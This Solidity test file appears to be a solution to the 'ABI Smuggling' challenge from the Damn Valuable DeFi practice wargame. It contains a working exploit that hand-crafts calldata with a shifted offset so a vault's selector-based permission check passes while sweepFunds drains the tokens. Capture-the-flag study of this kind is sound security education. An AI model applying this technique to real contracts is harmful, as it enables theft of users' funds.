// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {SelfAuthorizedVault} from "../../../src/Contracts/abi-smuggling/SelfAuthorizedVault.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ABISmuggling is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal token;
    SelfAuthorizedVault internal vault;
    address internal deployer;
    address internal player;
    address internal recovery;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        address payable[] memory users = utils.createUsers(3);
        deployer = users[0];
        player = users[1];
        recovery = users[2];
        vm.label(deployer, "Deployer");
        vm.label(player, "Player");
        vm.label(recovery, "Recovery");

        vm.startPrank(deployer);
        // Deploy Damn Valuable Token contract
        token = new DamnValuableToken();
        vm.label(address(token), "DVT");

        vault = new SelfAuthorizedVault();
        vm.label(address(vault), "SelfAuthorizedVault");
        assertFalse(vault.getLastWithdrawalTimestamp() == 0);

        // Set permissions
        bytes32 deployerPermission = vault.getActionId(0x85fb709d, deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(0xd9caed12, player, address(vault));
        bytes32[] memory ids = new bytes32[](2);
        ids[0] = deployerPermission;
        ids[1] = playerPermission;
        vault.setPermissions(ids);

        // Ensure permissions are set correctly
        assertTrue(vault.permissions(deployerPermission));
        assertTrue(vault.permissions(playerPermission));

        // Make sure Vault is initialized
        assertTrue(vault.initialized());

        // Deposit tokens into the vault
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();

        // Check balances
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(abi.encodeWithSelector(SelfAuthorizedVault.CallerNotAllowed.selector));
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.expectRevert(abi.encodeWithSelector(SelfAuthorizedVault.CallerNotAllowed.selector));
        vault.withdraw(address(token), player, 1e18);
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(player);

        // This is a very known type of exploit. In the execute function, the calldataOffset calculation is fixed rather than being flexible. Which means that we can adapt the calldata so that the functionCall calls the sweepFunds while selector allows the check to pass. How can we do this ? We can start with a predefined constructed calldata for execute function. Then adapt it.
        bytes memory data;
        data = abi.encodeWithSelector(vault.sweepFunds.selector, recovery, IERC20(address(token)));
        bytes memory data1 = abi.encodeWithSelector(vault.execute.selector, address(vault), data); 
        console.logBytes(data1);
        // @note Below is how the calldata is constructed by solidity. In byte position 100 we need to have the correct id which is d9caed12 so we need to change this. In byte position 36 we have the position of the length of the parameter actionData. This is the offset that tells solidity where the bytes data starts. We can change it byt putting 64 so that it would jump the id then we can carefully craft the calldata for the sweepFunds call.
        // 0x1cff79cd
        // 000000000000000000000000c5b4cb6297811afd2bccd375a49dac2f52c9c1d0
        // 0000000000000000000000000000000000000000000000000000000000000040
        // 0000000000000000000000000000000000000000000000000000000000000044
        // 85fb709d
        // 0000000000000000000000008ce502537d13f249834eaa02dde4781ebfe0d40f
        // 0000000000000000000000008ff72867187538c4f69caef19781650e6afbc3ec
        
        // 0x1cff79cd
        // 000000000000000000000000c5b4cb6297811afd2bccd375a49dac2f52c9c1d0
        // 0000000000000000000000000000000000000000000000000000000000000064
        // 0000000000000000000000000000000000000000000000000000000000000044
        // d9caed12
        // 0000000000000000000000000000000000000000000000000000000000000044
        // 85fb709d
        // 0000000000000000000000008ce502537d13f249834eaa02dde4781ebfe0d40f
        // 0000000000000000000000008ff72867187538c4f69caef19781650e6afbc3ec

        bytes memory vaultCalldataExploit = hex"1cff79cd000000000000000000000000c5b4cb6297811afd2bccd375a49dac2f52c9c1d000000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000044d9caed12000000000000000000000000000000000000000000000000000000000000004485fb709d0000000000000000000000008ce502537d13f249834eaa02dde4781ebfe0d40f0000000000000000000000008ff72867187538c4f69caef19781650e6afbc3ec";

        (bool success,) = address(vault).call(vaultCalldataExploit);
        require(success);

        vm.stopPrank();
        /**
         * EXPLOIT END *
         */

        validation();
    }

    function validation() internal {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(player), 0);
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE);
    }
}
